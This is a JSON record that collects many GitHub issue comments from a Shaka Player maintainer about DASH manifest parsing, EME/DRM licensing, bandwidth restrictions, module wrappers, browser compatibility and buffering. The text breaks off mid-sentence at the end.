{
    "joeyparrish": "Fixed in v1.1.\n. We could code those assumptions into a polyfill specifically for MediaKeys.isTypeSupported, and reasonably get that into our bugfix release v1.1.  This is tentatively scheduled for release on Jan 15.\nThe real fix is to quit relying on the concept of isTypeSupported, and instead to use the supportedConfigurations parameter of navigator.requestMediaKeySystemAccess.  This will require the refactor of several internal classes, which won't be ready until v1.2.\nI will file another issue to track the polyfill which will provide a fake isTypeSupported for v1.1.\n. Fixed in v1.1 docs.\n. Fixed in v1.1 docs.\n. Fixed in v1.1.\n. Fixed in v1.1 docs.\n. Fixed in v1.1.\n. Fixed in v1.1.\n. Thanks for the report.  Can you please send a sample MPD which exhibits this behavior?\n. Actually, never mind the MPD.  I found the issue.\nThe bug is in mpd_processor.js, in process().  The order of calculateDurations_() and processSegmentTemplates_() needs to be swapped.  Sorry for the inconvenience.\nWe'll push this fix out shortly in v1.1.\n. v1.1 is out now.  The fix was slightly more complicated than I originally thought, though, so you may want to update.\nAlso, we now have a user mailing list where you can ask questions and receive notifications of new releases.  https://groups.google.com/forum/#!forum/shaka-player-users\nThanks again for the bug report!\n. This is definitely a bug in the MPD parser.  Thanks for pointing this out.\nThe fact that the 0th segment is not skipped is not a bug.  If the video's playhead is at 0s, but there is no data in MediaSource for t=0s, then the video tag is in a \"buffering\" state.  This is to be expected, since MediaSource allows for data to be inserted in an arbitrary order.\nYou are right that timestamps need not begin at 0.  In that case, though, the correct thing to do is to use SegmentTemplate@presentationTimeOffset to indicate where they do start.  This is given in the timescale, so for the MPD you linked above, setting presentationTimeOffset=\"3000\" for both SegmentTemplates allows playback to begin with firstSegmentNumber=\"1\".\nWe will get the @firstSegmentNumber parser bug fixed, though.  Thanks!\n. Thanks, Gilles.  We'll take a look.\n. We definitely see the point of view that xs:unsignedInteger implies the validity of 0, so thank you for following up on this with the DASH-IF.\nWe will revert 5c7fca9 and consider @startNumber=0 to be invalid again until there is a clear correction to the spec one way or the other.  Please reopen this issue if @startNumber=0 is clarified to be valid.\n. Thanks for the update.  We will try to fix our code to reflect this\ncorrigendum.\n. Our previous fix, as you pointed out, was insufficient.  We reverted that change for now.\nAs @tdrews pointed out in his comment earlier in the thread, it seems that the only way to interpret 23009-1:2014 to ensure that $Number$ and $Time$ are non-negative is if startNumber and k both begin at one.\nYou mentioned a corrigendum, but it does not appear to be available in the list of publicly available standards on the ISO website.  We are still unable to locate it this morning, not even on the corrigenda tab under 23009-1:2014.\nWe'd love to resolve this in a way that is consistent with the latest amendments to the spec.  Where can we find this corrigendum?\n. I'm not comfortable making changes at this time based on a document that isn't open to the public.  However, I'm reopening this issue so that we don't lose sight of it.  When the updated standard is published, I will be happy to implement it.\n. When running in uncompiled mode, deps.js is required for goog.require to find the necessary source files.  This file is not checked into the sources, since it is generated as part of the build process.\nYou are getting an HTTP 404 on deps.js because you have not run the build scripts.  The quick answer is to run ./build/gendeps.sh to generate deps.js.  You could also run ./build/all.sh to run all build scripts, including deps generation and compilation.\nFor more information, please see the development tutorial in the docs.\nThe HTTP 500 error on poster.jpg is probably due to some kind of misconfiguration of your web server, since that is a static asset and can't itself generate any such error code.\n. I'm going to close this issue, but please feel free to reopen it if you have further problems with deps.\n. The necessary EME feature to detect this has not yet landed in Chrome.  We will try to add HDCP error detection as soon as the necessary API is available in Chrome canary.\n. This should be functional in Chrome 39 and 42, but due to a bug, the necessary information is not present in Chrome 40 and 41.\n. From ISO 23001-7 2nd edition:\n\naligned(8) class ProtectionSystemSpecificHeaderBox extends FullBox(\u2018pssh\u2019, version, flags=0)\n{\n  unsigned int(8)[16] SystemID;\n  if (version > 0) {\n    unsigned int(32) KID_count;\n    {\n      unsigned int(8)[16] KID; \n    } [KID_count];\n  }\n  unsigned int(32) DataSize;\n  unsigned int(8)[DataSize] Data; \n}\n\nThe generic CENC PSSH box is specified as requiring version=1 (see http://www.w3.org/TR/encrypted-media/cenc-format.html section 4)\n. Hi Torbj\u00f6rn,\nThanks for the link!  We will be sure to make that part of our testing as we work on this feature.\n. Yes, 404s are not ideal, but tolerable.  In the case of a live stream, a particular segment yielding 404 means the server has not made it available yet.  This could be a result of bad clock sync, or it could mean that we are trying to buffer ahead of the live edge.  This should not be fatal to playback.\nDepending on suggestedPresentationDelay, minBufferTime, and the particular style of manifest, we may or may not see 404s in v1.3.0.  Our Stream and SegmentIndex classes were designed before we supported live content, so we sometimes request segments which are not yet available.\nWe plan to refactor streaming and indices in 1.4.0 to fix this, after which only clock sync issues and broken manifests should be able to cause a 404.  Even then, we will still tolerate 404s and issue clock sync warnings rather than abort playback.\n. Yes, it has, both with static keys and with key rotation.  From an EME point of view, live content is nothing special.\n. Seems to be working lately.  Closing for now.\n. Good point.  Although whether or not to retry after a network failure could be considered an application-level decision, the application currently has no choice.\nIf we make shaka.media.Stream not only dispatch an error, but also set a timer to retry, then the application would have the choice of whether or not to shut down the Player when it sees the error event.\n. Hrm... It's easy enough to add, and I don't mind doing it.  But out of curiosity, why is it useful?  I had thought that there would be two basic use cases:\n1. Adaptation always enabled or disabled, and therefore set once programmatically.\n2. Adaptation always controlled by some application UI element, and therefore set on interaction with that element.\nWhen would you want to query the state?  How would your application lose track of whether or not adaptation was enabled?\n. I'm not sure it would get out of sync, though.  It's easy to set explicitly as soon as Player is created.\nIn any case, this debate is purely philosophical.  I don't object to the feature.  Please feel free to submit a pull request.\nIt may be a bit more pain than contributing to the typical open-source project, but Google does require a one-time contributor agreement as outlined in CONTRIBUTING.md.\nAnd thanks for offering to contribute.  You're the first!\n. @Awais-cb, this thread was closed 2.5 years ago.  Please try not to reopen very old threads.  Shaka Player looks very different today than it did in 2015.  Thanks!. Whoops!\nThis bug affects both the v1.2.1 tag in github and the 1.2.1 release on npm.\nBoth show up as v1.2.0-debug in uncompiled mode.  The npm release reports as v1.2.0-13-gfd26657, while the github release reports as v1.2.0-12-g77b7c7e.\n. 1. removed v1.2.1 from npm (since we can't change it)\n2. tightened up our release procedures and added some scripting to help us catch these problems before release\n3. published v1.2.2 on both github and npm with all of the version numbering fixed\n. The only use case we've had so far for disabling certain tracks is due to licensing issues.  For example, the user's platform may not be secure enough for a content provider to be comfortable providing the key for the HD tracks, so the license may only contain the key for the SD tracks.\nA license server has to have a way to signal the client that these restrictions are in place, and we've seen providers do this by adding headers to the license response.  (There may be other ways to communicate these restrictions using the new EME APIs, but this convention predates them.)  DrmSchemeInfo has a field for a license post-processor, which serves two purposes:\n1. Remove any headers from the license response which are specific to the application and not understood by the CDM.\n2. Parse any restrictions specified by those headers and communicate them to the rest of the system.\nWe created shaka.player.DrmSchemeInfo.Restrictions to represent those restrictions, which to date, have only been max height & max width.\nIf you want to restrict based on bandwidth, here's one way we could proceed:\n1. Add maxBandwidth to the Restrictions class.\n2. Come up with an API on Player to set/update restrictions outside of the license post-processor flow, so that your use case is not tied to encrypted media specifically.\n3. Your app can then set bandwidth limitations at any time.\nThoughts?\n. I see what you mean.  I'll elaborate my thoughts on setRestrictions() in the conversation on your latest pull request.  Thanks again for taking this on!\n. Closing now that #36 is merged.  Thanks again!\n. I'm not sure about setMaxBandwidth/setMinBandwidth.  What about something that would allow the user to set all restriction properties, without having to create setters for each one?  Perhaps something like getRestrictions / setRestrictions ?\nAlso, can you please make this change in the master branch?  The 1.2.x branch is for maintenance, to collect bugfixes relative to 1.2.0.  New features are being added to master, and will first be released as 1.3.0.\nWe've already refactored Player in master such that all EME-related stuff is in shaka.media.EmeManager.  The way things are organized now, you'll want to provide a reference to the Player's restrictions_ object to EmeManager to set the license-based restrictions.\n. Closing, superseded by #36.\n. Closing now that #35 is merged.  Thanks!\n. Since index.js is generated code, would you please add it to .gitignore?\n. Sorry for the delay, I missed the update.  Thanks for adding this!\n. With our next release version, 1.3.0, which I'm currently expecting by the end of the month.\nOh, and one more thing I forgot to ask you to add to the pull request before I merged it.  Can you please add yourself to CONTRIBUTORS and AUTHORS?\n. I wouldn't mind supporting both commonJS and requireJS by default, however I'd prefer it greatly if we could combine all of this into one wrapper.  It cuts down compilation time, which makes a big difference for us trying to iterate rapidly on new features.  Let's continue this discussion on #55.\n. Overall, looks pretty good.  If we change getRestrictions/setRestrictions a bit, the flow to update or add restrictions for the caller becomes:\nvar r = player.getRestrictions();\nr.maxBandwidth = 5;\nplayer.setRestrictions(r);\nThis won't interfere with or replace any resolution constraints imposed by the license server, and the two restrictions can be set in any order.\nIn fact, you could even have EmeManager request restrictions from the Player in the same way:\nvar restrictions = player.getRestrictions();\npostProcessor(response, restrictions);\nplayer.setRestrictions(restrictions);\nThen player.setRestrictions doesn't have to update EmeManager and EmeManager doesn't need to keep a copy of restrictions.\n. Looks great.  Thanks for taking the time to work on this!\n. Yes, Jason has the right of it.  We'll be releasing these changes in 1.3.0.  1.2.x is collecting bugfixes only.  We expect 1.3.0 out by the end of the month, and we'll update the milestones page if that changes.\n. Hi Nick,\nThe CuesElement is part of the WebM content itself, not the manifest.  It's an index that tells the library where individual segments are in the file.\nFor each Representation element in your manifest, there is a SegmentBase element with an indexRange property.  This is supposed to be the location of the cues element within the WebM file.\nSo it would seem that the bytes ranges in your manifest don't agree with your files.\n. Happy to help!\n. I am unable to reproduce this error.  When I run your script, I get valid WebM streams with Cues elements, and the byte ranges specified in the manifest are correct.\nCan you please send me the exact webm and mpd files you have produced with these steps?  If ffmpeg were to blame, I might fail to repro because I'm using a different version of ffmpeg.\n. I periodically update my build of ffmpeg from source.  But ffmpeg doesn't seem to be the problem, since I am unable to reproduce with these exact files you sent me.  I've also double-checked the manifest against the WebM files themselves, and the byte ranges are accurate.\nSo now we're down to either a Shaka Player bug, or a problem with your browser or your web server.\nTo check if it's the browser, can you try reproducing in Chrome instead of Opera?\n. That \"endOfStream\" error you're referencing from Chrome 41 is a red herring.  That's a Shaka Player which is unrelated.  (Filed as #43.)\nI just tried in Opera 28 and 29 on Linux, and I'm unable to reproduce your WebM error on either of those versions, either with the files you sent me or with the ones I produced myself.\nI'm going to label this \"working as intended\".  You may want to make sure your web server is serving the correct files and byte ranges as requested by the client.  I don't see any evidence that the WebM parser in Shaka is to blame.\n. I don't think there's a place in the docs for listing non-HTTP-compliant or otherwise broken web servers, in my opinion.  That's somewhat outside the scope of the project.\nIf you can figure out what SimpleHTTPServer doesn't support correctly, maybe they would like to hear about it in their issue tracker.  My first guess would be that it either ignores or incorrectly implements support for the \"Range\" request header.  But that's just a guess.\nGood luck!\n. True story.  I am doing a small refactor on Restrictions right now, and I will have this fixed as part of that.\n. Yes, it will be along the lines of (2), and will also remove the restrictions parameter from the license post processing callback.  This simplifies some things in EmeManager and makes the restrictions API more consistent.  Restrictions are then always set on the Player and set by the application, even if they are derived from a license response.\n. This seems to be working now, at least on Chrome 41.\n. Reproduced in Chrome 43.0.2353.0.\n. Tested working in Chrome 41, 42, and 43.\n. This appears to be a duplicate of issue #45, which was fixed last week.  Can you please try with a newer version of Shaka Player from the master branch?\n. I was able to reproduce this using Chrome 44 and v1.2.2, but not using the master branch.  So I am fairly certain this is a dup of #45.\nBut since #45 was a fairly substantial compatibility issue affecting both Chrome 43 and 44, we've tagged a new bugfix release (v1.2.3) and updated the demo at http://shaka-player-demo.appspot.com/ .  Please check that the problem is resolved on appspot, and upgrade your application to v1.2.3 at your earliest convenience.  If this doesn't resolve the problem for you, please reopen this issue.\nThanks!\n. Clock sync for live streams uses the Date header from the manifest response.  If this is served cross-origin, there is extra configuration required on the server in order for the client to be able to read this header.\n. It appears that the TypeError is caused by a bug in the master branch.  EWMABandwidthEstimator should be exported, but is being stripped as dead code since it is now only referenced at the application level.\n. @palmerj3 are you using the 1.2.x branch or master?  The TypeError bug described by @sanbornhnewyyz is only present in master.  (Introduced in 9c0d2db.)\n. @sanbornhnewyyz: TypeError fixed in 4571061.\n. Rather than building amd.js/index.js/index2.js, etc., I've put together a new wrapper template that works for commonJS in node, requireJS in node, requireJS in a browser, and direct use in a browser.  I've tested in those 4 scenarios and everything seems to be working.  Should have the change up on github soon.\n. I have a solution in review internally which does not attach to the window when using commonJS or requireJS.\n. @palmerj3 @sanbornhnewyyz Please check out the latest in master.  A new wrapper template was committed in 5f3a153.  If there are no objections, I will cherry-pick this into the 1.2.x branch as well.\n. I'm not getting this TypeError.  Can you please get the value of shaka.player.Player.version when one of these errors occurs?\n. @sanbornhnewyyz, what's the most recent commit you have from me?\nI'm unable to reproduce this in the test app in compiled mode, nor in a separate app using requireJS.  Can either of you provide me a sample which reproduces this problem?\nHere's the source to my working requireJS sample: https://gist.github.com/joeyparrish/64e3f0a1231f3ea382b9\nI tried all of the YouTube test content @palmerj3 linked to.  The manifest for oops_cenc is a 404, but all of the others play in the gist linked above.\n. Yes, that is new for v1.3.0, introduced in 9c0d2db.  The purpose is two-fold.  For one, passing an estimator lets you inject your own implementation of IBandwidthEstimator without modifying the library.  For another, it makes it possible to persist bandwidth information across playbacks, which means that the second video you stream can start in HD if you have enough bandwidth for it.\n. Well, v1.3.0 isn't complete yet.  I did not intend to break compatibility quite so hard.  :-)  I will make the parameter optional, and if null, we will create an instance of the default implementation.\n. After 44b975d, defaults to a new instance of EWMABandwidthEstimator() if not supplied by the caller.\n. If there are no objections, I am going to consider this resolved.  Please feel free to open a new issue if there are any remaining issues with module support.  And thanks again for helping get commonJS and requireJS supported.\n. This doesn't seem right.  Setting restrictions on the player at any time should result in a call to StreamVideoSource.prototype.setRestrictions(), which sets streamInfo.enabled=false for any stream which fails the new restrictions.\nAny stream which has enabled set to false will not be returned by StreamVideoSource.prototype.getVideoTracks(), and therefore not be chosen by AbrManager.\nAfter setting restrictions, does player.getVideoTracks() still return restricted tracks?\n. No worries!  Glad it's working.\n. Changing the name of the class is part of how the closure compiler works.  The names of the attributes are unchanged, so this is working as intended.\nIf the naming of the class itself is a problem for your application, you could always avoid compilation and run the uncompiled sources through the minifier of your choice.\n. Hi Sascha,\nI'm not deeply familiar with video.js, but I just took a quick look at their Tech docs and I don't see any reason why you couldn't wrap the Shaka Player library in a video.js Tech object.  You could probably start with their HTML5 Tech implementation as a basis.  You would just use DashVideoSource and Player.load() instead of setting video.src.\n. Hi Sascha, did we answer your question to your satisfaction?  If not, please feel free to either reopen the issue or start a conversation on the mailing list.  Thanks!\n. Hi James,\nIt's great to hear that Shaka is useful as a videojs tech.  Thanks for the link!  We'll check it out.\n. Thanks for the report.  We'll have a fix out soon.\n.  The original bug report was against 1.3.0.  It has since been fixed, and we are working toward publication of 1.3.1 with this and many other fixes.  This bugfix release is currently scheduled for May 22.  NPM only gets release versions, but if you need the fix sooner, please feel free to work from the latest sources on github.\n. I was thinking of adding hooks similar to the license response post-processor.  It would be something like a license request pre-processor, to allow you to alter/wrap the request before it is sent to the server.\nWould it suffice to modify the request body, or are you looking to control other things as well?  All I can think of is the URL, the body, the request headers, and whether or not to send cookies.\nThe URL has already been set by the application in DrmSchemeInfo, but is there a need to modify it later with data that wasn't available at the time ContentProtection was interpreted?\n. Okay, then we'll see about providing access to body, headers, and content type.  Thanks for the input!\n. I believe this might have had the same root cause as #61, which we just pushed a fix for.  Can you please try again with the latest from master?\n. Ah, I see.  Thanks for the report, as well as for re-testing.  We'll see what we can do to fix it.\n. We don't support that at the moment, but we will add it to the roadmap.  Thanks for the suggestion!\n. @baseballbrad3, some of these changes have already happened since v1.3.0, so please try the latest sources from master if you intend to work on browser support.\nSee a849f03, which removes reliance on node.children, 9ebd522, which adds a polyfill for CustomEvent, and 5a8a98f, which allows load.js to function without currentScript.\n@rob-vualto, would you care to contribute a patch to set currentTime after loadedmetadata fires?\n. I believe an IE11 EME polyfill should be possible.  If we can write one for Chrome's prefixed, non-OO EME, I presume IE11 should be simpler than that.  IE's EME implementation isn't Promise-based or up-to-date, but it's object-oriented, so you should be able to wrap or alias things and just add a few extra methods.\n. @jonoward:\n1. A Promise polyfill could be either something custom or something pre-existing.\n   1a. If you're going to import something external, please take care that the license is compatible with ours (Apache 2.0).  I would prefer something relatively simple, if possible.\n   1b. The advantage I see for something custom is that it would play better with the closure compiler's advanced mode.  I'm not sure what changes would be needed to adapt something pre-existing to our build, which is fairly strict.\n   1c. One more option is to make a Promise polyfill a prerequisite for using Shaka Player on IE11.  It could easily be included in a script tag before including Shaka Player.  This is a bit lazy, but it would work.\nMy preference would be 1b, but I'm flexible.\n1. Not sure what to do about CustomEvent.  I haven't looked into this on IE11 myself.  Does delete event.target and Object.defineProperties(event, {'target': ...}) in shaka.util.FakeEventTarget.prototype.dispatchEvent not work on IE11?\n2. If setMediaKeys can't be called on the video without a source, this may be something you'll have handle in a monkey-patched version of HTMLMediaElement.setMediaKeys.  Assuming, of course, that IE11 lets you patch over the native one at all.\n3. I'll have to take a closer look at the code you referenced, but adding a default pre-processor sounds reasonable.\nThanks!\n. shaka.player.Player.isBrowserSupported() will return false if Promises are not available, but does not give detailed reports on what is missing.\nI see that when you switched to defineProperty, you also switched from value/writable to get/set.  Does defineProperty work with value/writable on IE11?  I'm trying to understand if defineProperty is the necessary fix or if get/set is the necessary fix.\n. In any case, let's continue discussion of IE on another issue.  I will be writing a brief porting doc soon and will close this issue when that is done.\n. Alternately, we can start making use of key statuses from EME and default key IDs from the manifest to determine what we can and can't play before trying to.  This would be much simpler, but I'm not sure what the fallback would be if either feature was missing.  Also not sure if this would cover all bases regardless of what key system is in use, or if we still would have to fetch licenses and tolerate failures in some cases.\n. The usefulness of AS groups, as far as we are concerned, is to group together AdaptationSets and adapt between them.  Otherwise, you would only adapt within a single AdaptationSet.\nThe DASH interoperability (IOP) docs, as we understand them, state that ContentProtection should only exist at the AdaptationSet level, and that all Representations within an AdaptationSet must have the same key.\nTherefore, if you want to use different keys for SD/HD/UHD, and you also want to be DASH-IOP-compliant, you have to use groups.  Supporting this scenario is tricky for us, and requires the use of keystatuschanged events to determine whether or not we have keys for the higher-resolution parts of the group.\nFinally, the only way to correlate the key statuses with an AdaptationSet is through the cenc:default_KID element inside ContentProtection.  Otherwise, we don't have any way to know in advance what key IDs the different parts of the group will use, and we can't enable them.\nSo here's the checklist I would suggest:\n1) Do you use different keys to encrypt the AdaptationSets in the group?  If not, combine them into one AdaptationSet and stop using groups.\n2) If you are using groups, do you have cenc:default_KID inside of ContentProtection?  If not, group support can't function correctly, so you'll need to add these.\n. Correct.  If all the codecs and key IDs are the same, there's no reason to split up your AdaptationSets.\nTo enable debug logging, either run shaka.log.setLevel(shaka.log.Levels.DEBUG) in the app or add ?debug in the demo app URI.  With this enabled, do you see a message that says \"Key blah was not specified in the manifest\"?  This would indicate that you have the wrong key ID in your manifest, which would also explain the symptoms you're seeing.\nIf this message does not occur, then we may have a bug.  The code, as written, should still enable streams from other parts of the group once the license is processed.\nPlease let us know what you find out.\n. If you have cenc:default_KID in the manifest, but it's not in the stream info, then perhaps the issue is somewhere in the manifest parser/processor.  Can you file a new issue and include a manifest which reproduces the issue?\n. This could even be needed without app-specific extensions to ContentProtection.  For example:\n<ContentProtection schemeIdUri=\"urn:mpeg: dash:mp4protection:2011\" value=\"cenc\"/>\nFor some apps, this should be enough to supply a list of DrmSchemeInfos with license server endpoints for all the various DRM schemes that content provider uses.\n. What OS are you on?  What version of Java do you have?\n. The compiler is built with Java 1.7, so you will need that at a minimum.  Sorry for the inconvenience!  I will update the docs on github to mention this.\n. I'd like to streamline things and tag bugfix releases more frequently, but I just don't have the resources at the moment.  I hope to be able to improve this in the future.\nThe goal for our next bugfix release (v1.3.1) is to have all known issues in v1.3.0 fixed.  You can track progress here:  https://github.com/google/shaka-player/milestones/v1.3.1  This is currently scheduled for May 22, but this is just an estimate.\nI'm very sorry for the inconvenience, but if you need to get ahead of the release schedule, you can always check out the latest sources from github and run the build script.\n. Yeah, I'd like it to be more iterative, too.  It's a process issue, and we're working on it.  Thanks!\n. The cache-busting parameter has been a pain point for others, as well.  If there were a way to reliably detect when segments are being served from the local cache, we could do away with cache-busting and simply discard throughput measurements for cached responses.  If anyone has ideas on this point, I would be very happy to hear them.\n. Oh, and to add context, if you never seek, cached segments will never trouble you, even without cache-busting params.\nThe trouble is when you have very little bandwidth and have downloaded a bunch of 360p segments, then you seek backward and suddenly you appear to have enough bandwidth for 1080p and the player adapts up.  Since you don't actually have the bandwidth for that, the player adapts back down, possibly after a stall.  Then you get cache hits again for your 360p segments, then you adapt back up, etc.\n. v1.4.0 is out now, including a new method on IBandwidthEstimator so that a custom implementation can disable cache-busting.  Please let us know whether or not the new APIs resolve this issue for you.\n. See also #63\n. @sanbornhnewyyz, it seems to me that this is working as it should already.  Here are the cases I tested:\nCreate a player, do not load anything, and delay 2 seconds.\nCreate a player, load with autoplay true, and wait for the first frame to play.\nCreate a player, load with autoplay true, pause, and delay 2 seconds.\nCreate a player, load with autoplay false, and delay 2 seconds.\nIn all of these cases, no bufferingStart event is fired and bufferingHistory.length is 0.  Do you think this should be otherwise?  It was originally my intent for this event to fire when the content underruns, but I could be convinced that the initial buffering should count as well.\n. @sanbornhnewyyz: ping!\n. @sanbornhnewyyz: I added some new integration tests to ensure that we are being consistent with the bufferingStart event.  Please reopen if you feel that the use of bufferingStart is incorrect.\n. @JobaDiniz , what browser and version are you using when it throws that error?  I'm unable to reproduce in Chrome 43.\n. Still don't have repro, but FWIW, I tried these ways as alternatives:\ndelete video.src;  // has no effect.\nvideo.src = null;  // cast to a string, causes src to become a relative url to \"null\"\nvideo.removeAttribute('src');  // makes src attribute a blank string, but does not unload the original source\n. Ah, I see.  How frequently does this error occur?  What OS are you on?\n. @donato, are you getting a MEDIA_ERR_SRC_NOT_SUPPORTED error like @JobaDiniz?\n. I'm testing right now with Chrome 43.0.2357.65 on OS X 10.10.3.  I'm using the latest Shaka Player test app to load the manifest @donato mentioned.  I load the video, let it play for a few seconds, then call app.player_.unload() from the JavaScript console.\nI'm unable to reproduce the problem.  I've tried in both compiled & uncompiled modes.\n@donato, are you seeing the error in the Shaka Player test app?  Or only in your own application?  Are there other steps involved in repro than just loading a source and then calling unload a few seconds later?\n. @JobaDiniz, what's the value of video.error.code when this happens?\n. @JobaDiniz, @donato, I finally see what's going on.\nThis error is fired on video, but after Player has stopped listening for events.  this.eventManager_.removeAll() runs before the source is unloaded, so the Player does not receive this event.\nAs far as I can tell, this event is a completely harmless side-effect of the way we unload.  Until we (not we=Google, but we=the internet) come up with a better way of unloading a video source to reuse the video tag, my recommendation is not to listen for errors on the video tag directly.  Instead, listen for errors on Player.\nListening on the Player will filter out errors you shouldn't have to care about, like this one, and it will allow you to receive lots of important errors that aren't dispatched through the video tag, like DASH-related or network-related errors.\nSo this brings us back to the original topic: is it correct to unload this way?\nMy feeling on the matter is that yes, it is okay to unload this way, but I am very open to alternatives.  As mentioned in an earlier comment, I tried several alternatives already, to no avail:\ndelete video.src; // has no effect.\nvideo.src = null; // cast to a string, causes src to become a relative url to \"null\"\nvideo.removeAttribute('src'); // makes src attribute a blank string, but does not unload the original source\nIf anyone has any other ideas, or if anyone can find a more canonically correct approach to unloading in a w3c doc somewhere, I would be happy to try it.\n. It's very simple, and there's an example in app.js:\njs\nplayer.addEventListener('error', function(event) {\n  console.error(event);  // or whatever else you need to do with it\n});\nThis pattern can be found in the test app and the samples in the tutorial.\nWould it be helpful to call this out more explicitly in the docs somewhere?\n. I'm going to close this for now.  I've filed an issue to update the docs as #106.\n. Already fixed in master by 7ea820c, but we'll leave this open until we've released v1.3.1, which will contain a cherry-pick of this fix.  Thanks!\n. Both are acceptable to the player, which normalizes all language tags on ingestion.  One could argue that the MPD itself is wrong (supposed to follow BCP47, which says \"shortest ISO 639 language code\"), but the fact of the matter is that many MPDs in the wild do not follow BCP47.  For example, the language metadata in an MP4 is always a 3-letter code, and some packagers simply extract this and put it directly into the manifest.  This manifest in particular was cobbled together from two different packagers (one WebM and one MP4).\nSince the player is actually designed to handle both ISO 639-1 and 639-2 language codes (see also the heading \"Language Tags\" in the language tutorial, I am closing this as WAI.  Thanks!\n. This should be part of DrmSchemeInfo.\n. I would be very happy to accept a pull request to resolve these issues.\nSo far we've found Uint8Array, window.performance, and console issues.\nThe performance.now problem seems easy enough to fix, for example, by checking for (window.performance && window.performance.now).\nDo you have any ideas for dealing with load-time uses of Uint8Array?\nOnce these things are not causing load-time exceptions, we should add them to isBrowserSupported and the browser support test page (support.html/js).\n. Yes, you are right.  If we go with a nop-polyfill, the trouble will be that the polyfill must be loaded and installed before loading the library.\nIt seems to me that we assumed that we could construct Uint8Arrays at load-time.  Since that assumption is false, I believe we should just not use them at load-time.\nI moved the construction of PatchedMediaKeys.v01b.MediaKeyStatusMap.KEY_ID_ to v01b.install().  It seems that the closure compiler will still allow you to do this for a const type, so long as it is only set once.\nI handled EbmlParser.DYNAMIC_SIZES similarly in EbmlParser's constructor, only there I'm checking to see if it's already been constructed, since EbmlParser's constructor could easily be called many times.\nI don't have IE9 to test with, but please take 1e400f5 as an example and I'll let you take it from here.  If you run into anything where the fix is not obvious or affects design in some larger way, we can discuss here.  If you haven't read CONTRIBUTING.md and signed the contribution agreement, please do that before submitting a PR.  Thanks so much for looking into this!\n. Resolved by #110.  Thanks!\n. It depends on what is going on when this happens.  If you could, please use the JavaScript debugger or console.log to find out if shaka.media.Stream.prototype.onUpdate_ is still firing after the error, and if so, for which streams (check this.type_).\n. Is shaka.media.Stream.prototype.onUpdate_ still firing when the error occurs?  You can find out either by placing a breakpoint there in the debugger or by adding a console.log to onUpdate_.\n. If the onUpdate_ timer is still firing, then we are still filling the MSE SourceBuffer.  If it were recoverable from the Player level, seeking would do the trick.  The decode error from the HTML5 video element must be fatal, then.\nThis sort of problem goes down into MediaSource as far as I can tell.  Chrome's media stack will stall/fail if there is a gap over some hard-coded threshold, and I'm not aware of any way to control that.  The reason Exoplayer can handle it is because the Android media stack is completely different from the browser's.  You could always file a feature request against Chrome to have this MSE behavior changed.\nAs for retaining last frame or somehow masking the reload, I'm not sure this is easily doable from JavaScript/MSE.\nAnother workaround (albeit an ugly one) would be to pregenerate a map of discontinuities in each piece of VOD content, then listen for 'timeupdate' events on video and call video.currentTime += timeUntilEndOfGap right before the gap.  If you can't fix your content catalog or your encoder, this extra information would allow you to automate your seeking at the application layer.\nIn the mean time, is it possible for you to correct the content itself?  I don't understand why discontinuous content would be legitimate.  I would assume that would be a bug in your encoder, especially for VOD content.  Why would a single piece of VOD content have a gap?  I strongly encourage you to file a bug against your encoder software about these discontinuities.\n. Since there has been no response in three weeks, I am closing this issue.  Please feel free to reopen if this is still a problem for you.  Thanks!\n. I believe the MPD XML URL is in your screenshot.\nhttp://192.168.0.16:83/upload/index.mpd\nSince this is an HTTP 401 error, the library never received the XML itself.\nYou may want to look into CORS.  Any time an application makes a request to\na different origin, the server must provide certain headers to permit the\nrequest.  You application is hosted at http://192.168.0.39/, but is making\na request to http://192.168.0.16:83/.\nSee:\n  https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS\n  http://enable-cors.org/\nHope that helps!\n. @babyChou, I haven't seen any activity on this in a while, so I'm going to close the issue.  If you need further support, either reopen this issue or start a conversation on our users list.  Thanks!\n. Interesting... Can you help me understand your use case?\nMy understanding is that the bandwidth attribute on a Representation is the minimum bandwidth required to assure uninterrupted playback, assuming that minBufferTime has been buffered before playback begins.\nSo to me, it seems like overriding minBufferTime with something lower means that you might cause a stall later, while overriding with something higher will increase startup latency.  Is the goal to buffer more at startup to try to avoid rebuffers later?  Or to start faster because the content's minBufferTime is too conservative?  Or perhaps to startup faster for clients which are estimated to have significantly more bandwidth than required, such that minBufferTime can effectively be ignored?\n. Ah, I see.  This sounds pretty reasonable.  I would suggest a couple of changes to the commit you referenced.\nshaka.media.Stream.initialBufferSizeSeconds = Math.max(initialBufferSize, shaka.media.Stream.initialBufferSizeSeconds);\nIf the static value is low (as in the default value), this line would cause the static value to accumulate across all playbacks in this browser session.  For example, if I were to play content A with a buffer size of 6, then content B with a buffer size of 2, I would want B to start up as fast as specified in the manifest.  With your change, though, B would also buffer 6 seconds worth of content.\nI believe it would be preferable to do something like this:\nthis.initialBufferSize_ = Math.max(initialBufferSize, shaka.media.Stream.initialBufferSizeSeconds);\nand then later:\nvar segmentRange = streamInfo.segmentIndex.getRangeForInterval(this.video_.currentTime, this.initialBufferSize_);\nI also think getBufferingGoal_ should revert to its original state.  If the initial buffering goal is larger than 15s, we should attempt to maintain that goal throughout playback.\nI would prefer it if the test 'does not hang when seeking to evicted data' did not rely on setStreamBufferSize, since that is not what is under test.  I think the original way of shimming the minBufferTime should be restored.\n. Sorry, this is bad timing.  The next Stream refactoring change in progress on our side is actually going to move all of the minBufferTime logic to StreamVideoSource.  I apologize for the inconvenience.\n. Sorry for the delay in my response.\nWe're busy working on a major refactor (#51) right now, and one of the goals is actually to do away with buffering on switch.  The plan is to simply fetch the next segment from the new Representation.  If Representations are unaligned, the segment from the new Representation will partially overwrite the last buffered segment in the SourceBuffer.\nWould this address your needs without the extra knobs?\n. Okay, sounds good.  We should see the first part of #51 land this week.\n. I agree completely.  Configuration methods that did not already exist on Player in v1.3.1 could be moved purely to the new configure() interface.  Other configuration methods could be rewritten to delegate to configure internally, and would then be closure-annotated with \"deprecated\".\n. Thanks for bringing this up.  We're about to publish something similar to this in the next stage of #51.  We are no longer going to clear the buffer at all when switching bitrates.\nMore changes might be needed to implement exactly what you described.  Did I understand you correctly that you want switches to higher quality to overwrite the buffer at the playhead, while switches to lower quality content are appended at the end of the buffer?\n. The patch we are finishing now will allow something close to this, but not quite.  We have a parameter on the video source's switch() method which allows the caller to optionally clear the buffer when switching representations.\nOne of the outcomes of clearing the buffer is that it naturally requires content to be inserted at video.currentTime, but this results in a noticeable stutter.  We would use this flag, for example, when a user manually selects a fixed resolution (disabling ABR), at which point it is acceptable.  But for an automated switch, we would obviously want to avoid the stutter.\nSo it sounds like you would need some way to ask that the content be appended 